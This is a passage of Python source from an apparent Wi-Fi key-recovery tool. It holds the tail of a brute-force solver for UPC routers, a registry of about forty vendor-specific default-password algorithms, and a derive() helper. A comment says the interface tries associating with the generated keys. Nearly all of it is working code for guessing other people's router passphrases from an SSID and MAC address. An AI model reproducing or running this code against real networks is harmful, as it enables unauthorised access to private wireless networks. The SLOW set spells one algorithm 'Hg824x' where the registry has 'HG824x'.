                    base = _u32(b0 * 2500000 + (b1 * 10 + b2) * 6800 + magic)
                    for b3 in solve(base):
                        if _upc_generate_ssid([b0, b1, b2, b3], magic) == target:
                            hits.append((b3, mode))
                # When both magics name the same serial, upstream keeps only
                # the reversed (mode 2) form.
                if len(hits) == 2 and hits[0][0] == hits[1][0]:
                    hits = [hits[1]]
                for b3, mode in hits:
                    for prefix in _UPC_PREFIXES:
                        serial = "%s%d%02d%d%04d" % (prefix, b0, b1, b2, b3)
                        if mode == 2:
                            serial = serial[::-1]
                        h1 = hashlib.md5(serial.encode()).digest()
                        w1 = _upc_mangle([
                            int.from_bytes(h1[i * 2:i * 2 + 2], "little")
                            for i in range(4)])
                        w2 = _upc_mangle([
                            int.from_bytes(h1[8 + i * 2:10 + i * 2], "little")
                            for i in range(4)])
                        h2 = hashlib.md5(
                            ("%08X%08X" % (w1, w2)).encode()).digest()
                        key = _upc_pass(h2)
                        if key not in seen:
                            seen.add(key)
                            out.append(key)
            if cancelled and cancelled():
                return out
            if progress and not (b1 & 0x0F):
                progress(b1 + 1, 100)
    return out


# ── registry ───────────────────────────────────────────────────────────────

KEYGENS = {
    "Thomson": thomson,
    "Huawei": huawei,
    "HG824x": hg824x,
    "Zyxel": zyxel,
    "Comtrend": comtrend,
    "Arcadyan": arcadyan,
    "ArnetPirelli": arnetpirelli,
    "Pirelli": pirelli,
    "Dlink": dlink,
    "Belkin": belkin,
    "Sitecom": sitecom,
    "SitecomWLR2100": sitecom_wlr2100,
    "SitecomWLR400x": sitecom_wlr400x,
    "Bssid": bssid,
    "BaseX": basex,
    "Teletu": teletu,
    "AliceItaly": alice_italy,
    "AliceGermany": alice_germany,
    "Wlan2": wlan2,
    "Wlan6": wlan6,
    "Discus": discus,
    "Eircom": eircom,
    "Infostrada": infostrada,
    "InterCable": intercable,
    "Ono": ono,
    "OteBAUD": ote_baud,
    "PBS": pbs,
    "CabovisaoSagem": cabovisao_sagem,
    "Speedport500": speedport500,
    "Axtel": axtel,
    "Verizon": verizon,
    "WifimediaR": wifimedia_r,
    "Tpw4g": tpw4g,
    "Pldt": pldt,
    "Eijsink": eijsink,
    "Gontwifi": gontwifi,
    "SkyV1": sky_v1,
    "Tecom": tecom,
    "Andared": andared,
    "Conn": conn,
    "Upc07": upc07,
    "OteHuawei": ote_huawei,
}

# Algorithms whose output can exceed a couple of hundred candidates.  The UI
# asks before running these so a casual press of A does not spend 15 minutes
# associating.
SLOW = {"Thomson", "Upc07", "Comtrend", "Speedport500", "Hg824x", "SitecomWLR400x"}


def derive(name: str, ssid: str, mac: str, **kwargs) -> list[str]:
    """Run one named algorithm and de-duplicate its output, keeping order."""
    fn = KEYGENS.get(name)
    if fn is None:
        return []
    mac = _norm(mac)
    if name != "AliceItaly":
        mac = mac[:12]
    seen = set()
    out = []
    for key in fn(ssid, mac, **kwargs) or []:
        if key and key not in seen:
            seen.add(key)
            out.append(key)
    return out
